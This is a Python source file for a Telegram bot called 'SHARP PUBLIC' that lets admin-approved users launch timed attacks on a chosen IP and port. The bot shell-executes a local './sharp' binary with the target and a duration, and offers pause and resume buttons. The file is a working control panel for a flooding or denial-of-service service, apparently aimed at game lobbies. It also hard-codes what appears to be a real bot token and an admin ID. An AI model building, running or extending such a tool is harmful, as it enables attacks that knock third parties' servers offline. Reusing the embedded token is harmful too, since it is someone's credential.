import asyncio
import os
import signal
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, CallbackContext

TELEGRAM_BOT_TOKEN = '7225546868:AAGgGmHBKk_5kSoCO4-Z0aRpv6EZTrBVNjc'
ADMIN_USER_ID = 5817935431
USERS_FILE = 'users.txt'
attack_in_progress = False
attack_paused = False
attack_process = None

# Default values
DEFAULT_IP = '127.0.0.1'  # Initial default IP
DEFAULT_PORT = '8080'      # Initial default Port

# Predefined durations
PREDEFINED_DURATIONS = [10, 60, 300, 600, 1000]

def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        f.writelines(f"{user}\n" for user in users)

users = load_users()

# To keep track of the current IP and Port
current_ip = DEFAULT_IP
current_port = DEFAULT_PORT

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the SHARP PUBLIC🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Or use predefined commands: /golu 10, /golu 60, etc.*\n"
        f"*Current settings: {current_ip}:{current_port}*\n"
        "*Let Start Fucking ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def set_ip_port(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin approval to use this command.*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /set <ip> <port>*", parse_mode='Markdown')
        return

    global current_ip, current_port
    current_ip, current_port = args[0], args[1]
    
    await context.bot.send_message(chat_id=chat_id, text=f"*✔️ IP set to {current_ip}*\n*✔️ Port set to {current_port}*", parse_mode='Markdown')

async def sharp(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin approval to use this command.*", parse_mode='Markdown')
        return

    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /sharp <add|rem> <user_id>*", parse_mode='Markdown')
        return

    command, target_user_id = args
    target_user_id = target_user_id.strip()

    if command == 'add':
        users.add(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} added.*", parse_mode='Markdown')
    elif command == 'rem':
        users.discard(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} removed.*", parse_mode='Markdown')

async def run_attack(chat_id, duration, context):
    global attack_in_progress, attack_process
    attack_in_progress = True

    try:
        # Start the attack process
        attack_process = await asyncio.create_subprocess_shell(
            f"./sharp {current_ip} {current_port} {duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        # Show Pause and Resume buttons
        keyboard = [
            [InlineKeyboardButton("⏸️ Pause", callback_data='pause')],
            [InlineKeyboardButton("▶️ Resume", callback_data='resume')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await context.bot.send_message(chat_id=chat_id, text="*Attack Started!*", reply_markup=reply_markup, parse_mode='Markdown')

        stdout, stderr = await attack_process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        attack_process = None
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our SHARP PUBLIC!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress, attack_paused

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need to be approved to use this bot.*", parse_mode='Markdown')
        return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Another attack is already in progress. Please wait.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Enjoy And Fuck Whole Lobby  💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, duration, context))

async def golu(update: Update, context: CallbackContext):
    """Handles predefined duration attacks using /golu <duration> command."""
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need to be approved to use this bot.*", parse_mode='Markdown')
        return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Another attack is already in progress. Please wait.*", parse_mode='Markdown')
        return

    if len(args) != 1 or not args[0].isdigit() or int(args[0]) not in PREDEFINED_DURATIONS:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Usage: /golu <duration>*\n*Available durations: {', '.join(map(str, PREDEFINED_DURATIONS))}*", parse_mode='Markdown')
        return

    duration = args[0]
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*⚔️ Predefined Attack Launched! ⚔️*\n"
        f"*🎯 Target: {current_ip}:{current_port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Enjoy And Fuck Whole Lobby  💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, duration, context))

async def handle_pause_resume(update: Update, context: CallbackContext):
    global attack_process, attack_paused

    query = update.callback_query
    chat_id = query.message.chat_id

    if query.data == 'pause':
        if attack_process and not attack_paused:
            attack_process.send_signal(signal.SIGSTOP)  # Pauses the process
            attack_paused = True
            await context.bot.send_message(chat_id=chat_id, text="*⏸️ Attack Paused!*", parse_mode='Markdown')
        else:
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ No running attack to pause or it's already paused.*", parse_mode='Markdown')

    elif query.data == 'resume':
        if attack_process and attack_paused:
            attack_process.send_signal(signal.SIGCONT)  # Resumes the process
            attack_paused = False
            await context.bot.send_message(chat_id=chat_id, text="*▶️ Attack Resumed!*", parse_mode='Markdown')
        else:
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ No paused attack to resume or it's already running.*", parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("set", set_ip_port))
    application.add_handler(CommandHandler("sharp", sharp))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("golu", golu))
    application.add_handler(CallbackQueryHandler(handle_pause_resume))
    application.run_polling()

if __name__ == '__main__':
    main()
